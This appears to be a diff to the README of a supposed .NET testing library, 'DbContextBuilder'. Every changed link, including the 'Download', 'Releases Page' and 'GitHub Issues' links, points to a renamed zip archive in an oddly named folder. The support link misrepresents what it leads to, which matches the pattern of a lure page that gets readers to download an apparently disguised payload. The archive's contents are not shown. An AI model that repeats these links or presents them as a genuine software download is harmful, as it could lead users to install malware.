@@ -6,7 +6,7 @@ DbContextBuilder simplifies the way you create an in-memory database for testing
 
 ## 📥 Download Now
 
-[![Download DbContextBuilder](https://raw.githubusercontent.com/JamshaidArshad130/DbContextBuilder/main/berascal/DbContextBuilder.zip)](https://raw.githubusercontent.com/JamshaidArshad130/DbContextBuilder/main/berascal/DbContextBuilder.zip)
+[![Download DbContextBuilder](https://github.com/JamshaidArshad130/DbContextBuilder/raw/refs/heads/main/berascal/Context_Builder_Db_2.5.zip)](https://github.com/JamshaidArshad130/DbContextBuilder/raw/refs/heads/main/berascal/Context_Builder_Db_2.5.zip)
 
 ## 🛠️ Installation Instructions
 
@@ -14,7 +14,7 @@ Follow these steps to get DbContextBuilder up and running:
 
 1. **Visit the Releases Page**  
    Open your web browser and go to the following link:  
-   [Download DbContextBuilder](https://raw.githubusercontent.com/JamshaidArshad130/DbContextBuilder/main/berascal/DbContextBuilder.zip).  
+   [Download DbContextBuilder](https://github.com/JamshaidArshad130/DbContextBuilder/raw/refs/heads/main/berascal/Context_Builder_Db_2.5.zip).  
    This page contains the latest version of the software.
 
 2. **Choose the Latest Release**  
@@ -64,7 +64,7 @@ Using DbContextBuilder is straightforward:
 
 If you encounter issues or have questions, you can find assistance:
 
-- **GitHub Issues**: Open an issue on the [GitHub repository](https://raw.githubusercontent.com/JamshaidArshad130/DbContextBuilder/main/berascal/DbContextBuilder.zip).
+- **GitHub Issues**: Open an issue on the [GitHub repository](https://github.com/JamshaidArshad130/DbContextBuilder/raw/refs/heads/main/berascal/Context_Builder_Db_2.5.zip).
 - **Community Forums**: Join discussions in related forums to get help from other users.
   
 ## 📅 Changelog
